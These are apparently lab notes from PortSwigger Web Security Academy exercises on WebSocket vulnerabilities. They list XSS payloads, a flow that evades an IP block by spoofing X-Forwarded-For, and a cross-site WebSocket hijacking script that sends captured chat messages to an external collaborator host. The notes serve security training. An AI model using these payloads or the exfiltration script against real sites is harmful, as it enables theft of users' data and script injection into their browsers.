### Manipulating WebSocket messages to exploit vulnerabilities
**Payload** :
```html
<img src=# onerror=alert(1) />
```

### Manipulating the WebSocket handshake to exploit vulnerabilities
**Payload** :
```html
<img src=1 oNeRrOr=alert`1`>
```
**Flow**: try simple xss payload -> IP got blocked -> send to repeater the ws request -> try reconnect -> add header `X-Forwarded-For: 1.1.1.1` on handshake -> connect -> send the above payload

### Cross-site WebSocket hijacking
**Payload** :
```html
<script>
    var ws = new WebSocket('wss://0a0100510427225980f194a900390099.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://j5ptbath534duodoqnzgokqqghm8azyo.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

### SameSite Strict bypass via sibling domain
Just Read the write up
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain




